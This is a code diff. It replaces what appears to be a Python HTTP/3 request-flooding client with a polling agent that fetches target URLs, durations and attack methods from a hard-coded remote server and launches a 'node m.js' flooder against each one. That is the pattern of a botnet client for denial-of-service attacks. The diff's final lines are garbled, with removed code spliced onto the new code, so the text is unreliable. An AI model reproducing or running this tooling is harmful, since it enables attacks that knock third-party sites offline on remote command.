@@ -1,111 +1,321 @@
-import sys
-import asyncio
-import ssl
+import requests
+import json
 import time
-import argparse
-from urllib.parse import urlparse
-from contextlib import AsyncExitStack
-from typing import List
-import random
-from aioquic.asyncio import connect
-from aioquic.asyncio.protocol import QuicConnectionProtocol
-from aioquic.h3.connection import H3_ALPN, H3Connection
-from aioquic.h3.events import HeadersReceived, DataReceived
-from aioquic.quic.configuration import QuicConfiguration
-from aioquic.quic.events import ConnectionTerminated
-from aioquic.tls import CipherSuite
+import subprocess
+import threading
+import os
+import sys
+from datetime import datetime
+import logging
 
-try:
-    import uvloop
-    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
-except ImportError:
-    print("Warning: uvloop not installed. Install for better performance: pip install uvloop")
+# Configure logging
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(levelname)s - %(message)s',
+    handlers=[
+        logging.FileHandler('monitor.log'),
+        logging.StreamHandler()
+    ]
+)
 
-class Http3Response:
-    """Holds response data for a single request. Optimized: no body storage."""
-    __slots__ = ('headers', 'done')
-    def __init__(self):
-        self.headers = None
-        self.done = asyncio.get_event_loop().create_future()
-
-class Http3ClientProtocol(QuicConnectionProtocol):
-    """Protocol handling a single QUIC connection."""
-    def __init__(self, *args, **kwargs):
-        super().__init__(*args, **kwargs)
-        self.h3 = H3Connection(self._quic)
-        self.streams = {}
-
-    def quic_event_received(self, event):
-        if isinstance(event, ConnectionTerminated):
-            for stream_id, resp in list(self.streams.items()):
-                if not resp.done.done():
-                    resp.done.set_exception(ConnectionError(f"Connection terminated: {event.error_code}"))
-            self.streams.clear()
-            return
-
-        for h3_event in self.h3.handle_event(event):
-            sid = getattr(h3_event, "stream_id", None)
-            if sid not in self.streams:
-                continue
-            resp = self.streams[sid]
-            if isinstance(h3_event, HeadersReceived):
-                resp.headers = h3_event.headers
-            elif isinstance(h3_event, DataReceived):
-                if h3_event.stream_ended:
-                    resp.done.set_result(True)
-                    self.streams.pop(sid, None)
-
-    async def send_request(self, headers: List[tuple], timeout: float = 10.0) -> Http3Response:
-        """Send a request and return the response."""
-        stream_id = self._quic.get_next_available_stream_id()
-        resp = Http3Response()
-        self.streams[stream_id] = resp
-        self.h3.send_headers(stream_id, headers, end_stream=True)
-        self.transmit()
+class EndpointMonitor:
+    def __init__(self, base_url, username, check_interval=5):
+        """
+        Initialize the monitor
+        
+        Args:
+            base_url: Base URL of the server (e.g., http://127.0.0.1:3001)
+            username: Username to monitor (e.g., 'john')
+            check_interval: How often to check for new items (seconds)
+        """
+        self.base_url = base_url.rstrip('/')
+        self.username = username
+        self.check_interval = check_interval
+        self.endpoint_url = f"{self.base_url}/{self.username}"
+        self.removal_url = f"{self.base_url}/{self.username}/done"
+        self.processed_items = set()  # Track processed items to avoid duplicates
+        self.running = True
+        self.active_processes = []  # Track active subprocesses
+        
+    def fetch_active_items(self):
+        """Fetch active items from the endpoint"""
         try:
-            await asyncio.wait_for(resp.done, timeout=timeout)
-            return resp
-        except asyncio.TimeoutError:
-            self.streams.pop(stream_id, None)
-            raise
-
-class ConnectionPool:
-    """Manages a pool of QUIC connections for load distribution."""
-    def __init__(self, host: str, port: int, config: QuicConfiguration, pool_size: int):
-        self.host = host
-        self.port = port
-        self.config = config
-        self.initial_pool_size = pool_size
-        self.pool: List[Http3ClientProtocol] = []
-        self._lock = asyncio.Lock()
-        self._stack = None
-        self._running = True
-
-    async def __aenter__(self):
-        self._stack = AsyncExitStack()
-
-        async def create_conn(i):
+            response = requests.get(self.endpoint_url, timeout=10)
+            if response.status_code == 200:
+                data = response.json()
+                if data.get('success'):
+                    connections = data.get('connections', [])
+                    return connections
+                else:
+                    logging.error(f"API returned error: {data.get('message', 'Unknown error')}")
+                    return []
+            else:
+                logging.error(f"HTTP {response.status_code}: {response.text}")
+                return []
+        except requests.exceptions.RequestException as e:
+            logging.error(f"Request failed: {e}")
+            return []
+    
+    def extract_item_key(self, item):
+        """Create a unique key for each item"""
+        if 'url' in item:
+            # New format: url, time, method
+            return f"{item.get('url')}_{item.get('time')}_{item.get('method')}"
+        else:
+            # Legacy format: ip, port, time
+            return f"{item.get('ip')}_{item.get('port')}_{item.get('time')}"
+    
+    def execute_method_1(self, url, time_param, item_key):
+        """Execute command for method 1"""
+        # Convert time to integer if possible
+        try:
+            time_int = int(time_param)
+        except ValueError:
+            time_int = 60  # Default to 60 seconds if conversion fails
+            
+        command = [
+            "node", "m.js", url, str(time_int), "1", "1", "1"
+        ]
+        
+        logging.info(f"Method 1 - Executing: {' '.join(command)}")
+        
+        try:
+            # Run the command
+            process = subprocess.Popen(
+                command,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                text=True,
+                bufsize=1,
+                universal_newlines=True
+            )
+            
+            # Store process reference
+            self.active_processes.append({
+                'process': process,
+                'item_key': item_key,
+                'start_time': datetime.now(),
+                'url': url,
+                'method': 1
+            })
+            
+            # Start a thread to read output
+            def read_output(proc, key):
+                for line in proc.stdout:
+                    logging.info(f"[Method 1 - {key}] {line.strip()}")
+                proc.wait()
+                
+            output_thread = threading.Thread(
+                target=read_output,
+                args=(process, item_key)
+            )
+            output_thread.daemon = True
+            output_thread.start()
+            
+            # Schedule removal after 4 seconds
+            threading.Timer(4.0, self.remove_item, args=(url, time_param, item_key)).start()
+            
+            return process
+            
+        except Exception as e:
+            logging.error(f"Failed to execute method 1 command: {e}")
+            return None
+    
+    def execute_method_2(self, url, time_param, item_key):
+        """Execute command for method 2"""
+        # Convert time to integer if possible
+        try:
+            time_int = int(time_param)
+        except ValueError:
+            time_int = 60  # Default to 60 seconds if conversion fails
+            
+        command = [
+            "node", "m.js", url, str(time_int), "4", "h1"
+        ]
+        
+        logging.info(f"Method 2 - Executing: {' '.join(command)}")
+        
+        try:
+            # Run the command
+            process = subprocess.Popen(
+                command,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                text=True,
+                bufsize=1,
+                universal_newlines=True
+            )
+            
+            # Store process reference
+            self.active_processes.append({
+                'process': process,
+                'item_key': item_key,
+                'start_time': datetime.now(),
+                'url': url,
+                'method': 2
+            })
+            
+            # Start a thread to read output
+            def read_output(proc, key):
+                for line in proc.stdout:
+                    logging.info(f"[Method 2 - {key}] {line.strip()}")
+                proc.wait()
+                
+            output_thread = threading.Thread(
+                target=read_output,
+                args=(process, item_key)
+            )
+            output_thread.daemon = True
+            output_thread.start()
+            
+            # Schedule removal after 4 seconds
+            threading.Timer(4.0, self.remove_item, args=(url, time_param, item_key)).start()
+            
+            return process
+            
+        except Exception as e:
+            logging.error(f"Failed to execute method 2 command: {e}")
+            return None
+    
+    def remove_item(self, url, time_param, item_key):
+        """Remove item from the server after execution"""
+        try:
+            # For new format (url, time, method)
+            removal_params = {
+                'url': url,
+                'time': time_param
+            }
+            
+            response = requests.get(f"{self.base_url}/{self.username}/visitors", params=removal_params)
+            
+            if response.status_code == 200:
+                logging.info(f"Removed item: {item_key}")
+            else:
+                logging.warning(f"Failed to remove item {item_key}: HTTP {response.status_code}")
+                
+        except Exception as e:
+            logging.error(f"Error removing item {item_key}: {e}")
+    
+    def cleanup_old_processes(self):
+        """Clean up completed processes from tracking list"""
+        current_time = datetime.now()
+        self.active_processes = [
+            p for p in self.active_processes 
+            if p['process'].poll() is None  # Process is still running
+            or (current_time - p['start_time']).total_seconds() < 300  # Or less than 5 minutes old
+        ]
+    
+    def monitor_loop(self):
+        """Main monitoring loop"""
+        logging.info(f"Starting monitor for {self.endpoint_url}")
+        logging.info(f"Check interval: {self.check_interval} seconds")
+        
+        while self.running:
             try:
-                cm = connect(
-                    self.host,
-                    self.port,
-                    configuration=self.config,
-                    create_protocol=Http3ClientProtocol,
-                    wait_connected=True
-                )
-                protocol = await asyncio.wait_for(
-                    self._stack.enter_async_context(cm),
-                    timeout=10.0
-                )
-                return protocol
-            except asyncio.TimeoutError:
-                print(f"  Cảnh báo: Kết nối {i + 1} timeout, bỏ qua...")
-                return None
+                # Clean up old processes
+                self.cleanup_old_processes()
+                
+                # Fetch current active items
+                items = self.fetch_active_items()
+                
+                if items:
+                    logging.info(f"Found {len(items)} active item(s)")
+                    
+                    for item in items:
+                        item_key = self.extract_item_key(item)
+                        
+                        # Skip if already processed
+                        if item_key in self.processed_items:
+                            continue
+                        
+                        # Process based on item type
+                        if 'url' in item and 'method' in item:
+                            # New format: url, time, method
+                            url = item['url']
+                            time_param = item['time']
+                            method = item['method']
+                            
+                            logging.info(f"New item detected: {url} | Time: {time_param} | Method: {method}")
+                            
+                            # Mark as processed
+                            self.processed_items.add(item_key)
+                            
+                            # Execute based on method
+                            if str(method) == '1':
+                                self.execute_method_1(url, time_param, item_key)
+                            elif str(method) == '2':
+                                self.execute_method_2(url, time_param, item_key)
+                            else:
+                                logging.warning(f"Unknown method: {method} for item {item_key}")
+                        else:
+                            # Legacy format: ip, port, time (skip or handle differently)
+                            logging.info(f"Legacy item detected: {item}")
+                            self.processed_items.add(item_key)
+                
+                # Wait before next check
+                time.sleep(self.check_interval)
+                
+            except KeyboardInterrupt:
+                logging.info("Received keyboard interrupt, shutting down...")
+                self.stop()
+                break
             except Exception as e:
-                print(f"  Cảnh báo: Kết nối {i + 1} thất bại: {type(e).__name__}")
-                return None
+                logging.error(f"Error in monitor loop: {e}")
+                time.sleep(self.check_interval)
+    
+    def stop(self):
+        """Stop the monitor and cleanup"""
+        self.running = False
+        logging.info("Stopping monitor...")
+        
+        # Terminate all running processes
+        for proc_info in self.active_processes:
+            try:
+                proc_info['process'].terminate()
+                logging.info(f"Terminated process for {proc_info['item_key']}")
+            except:
+                pass
+        
+        # Wait a bit for processes to terminate
+        time.sleep(2)
+        
+        # Force kill any remaining processes
+        for proc_info in self.active_processes:
+            try:
+                if proc_info['process'].poll() is None:
+                    proc_info['process'].kill()
+            except:
+                pass
 
-        coros = [create_conn(i) for i in range(self.initial_pool_size)]
+def main():
+    """Main function"""
+    # Configuration
+    BASE_URL = "http://37.114.46.10:3001"
+    USERNAME = "team"
+    CHECK_INTERVAL = 5  # seconds
+    
+    # Create monitor instance
+    monitor = EndpointMonitor(BASE_URL, USERNAME, CHECK_INTERVAL)
+    
+    try:
+        # Start monitoring
+        monitor.monitor_loop()
+    except KeyboardInterrupt:
+        monitor.stop()
+        logging.info("Monitor stopped by user")
+    except Exception as e:
+        logging.error(f"Fatal error: {e}")
+        monitor.stop()
+        sys.exit(1)
+
+if __name__ == "__main__":
+    # Check if m.js exists
+    if not os.path.exists("m.js"):
+        logging.warning("Warning: m.js file not found in current directory")
+        logging.info("Current directory: " + os.getcwd())
+        logging.info("Please ensure m.js is in the same directory as this script")
+    
+    main()        coros = [create_conn(i) for i in range(self.initial_pool_size)]
         results = await asyncio.gather(*coros)
         self.pool = [p for p in results if p is not None]
         
